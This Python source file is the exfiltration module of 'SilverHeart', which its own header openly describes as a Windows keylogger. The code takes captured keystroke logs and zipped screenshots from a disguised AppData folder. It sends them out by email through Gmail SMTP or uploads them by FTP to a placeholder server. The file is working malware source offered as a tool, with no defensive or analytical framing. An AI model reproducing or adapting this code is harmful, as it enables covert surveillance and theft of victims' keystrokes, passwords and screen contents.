""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
    Copyright (C) 2020 Pedro Vieira

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
"""

import ftplib
import os
import shutil
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

Directory = 'C:\\Users\\' + \
            os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'


class sender:
    def byEmail():

        try:
            user = 'origin@company.com'
            to = "detination@company.com"
            pswrd = "password"

            msg = MIMEMultipart()

            msg["From:"] = user
            msg["To"] = to
            msg["Subject"] = 'Logs'
            body = 'Hey, what up sending u logs \n'
            body1 = 'ZIP attachments'

            # Defines the LOG file that is supposed to be sent
            msg.attach(MIMEText(body, "plain"))
            filename = "Keys.log"
            attachment = open(Directory + 'Keys.log', "rb")

            # Defines the ZIP screenshots file that is supposed to be sent
            msg.attach(MIMEText(body1, "plain"))
            filename1 = "Am0ASk2.zip"
            attachment1 = open(Directory + 'Am0ASk2.zip', 'rb')

            # Prepares the attachement for the LOG file
            part = MIMEBase("application", "octet-stream")
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition",
                            "attachment; filename= %s" % filename)

            # Prepares the attachement for the ZIP file
            part1 = MIMEBase("application", "octet-stream")
            part1.set_payload((attachment1).read())
            encoders.encode_base64(part1)
            part1.add_header("Content-Disposition",
                             "attachment; filename= %s" % filename1)

            # Attaches the files
            msg.attach(part)
            msg.attach(part1)

            server = smtplib.SMTP_SSL(
                'smtp.gmail.com',  # gmail (SMTP_SSL) port 465
                465
            )  # using smtplib.SMTP_SSL instead to ensure secure connection

            # server.ehlo() <- command to create a insecure connection
            # server.starttls() <- make the connection secure  (starttls port 587)

            server.login(user, pswrd)
            Text = msg.as_string()
            server.sendmail(user, to, Text)
            server.quit()

        # Never gets printed
        except smtplib.SMTPConnectError:
            print("Error Connection")
        except smtplib.SMTPServerDisconnected:
            print('Server refused')
        else:
            print("Email Sent")

    def byFTP():
        session = ftplib.FTP('server.address.com', 'USERNAME', 'PASSWORD')
        file = open(Directory + 'Keys.log')  # LOG to send
        session.storbinary('STOR Keys.log', file)  # send LOG
        file.close()
        file1 = open(Directory + 'Am0ASk2.zip')  # ZIP to send
        session.storbinary('STOR Am0Sk2.zip', file1)  # send ZIP
        file1.close()
        session.quit()
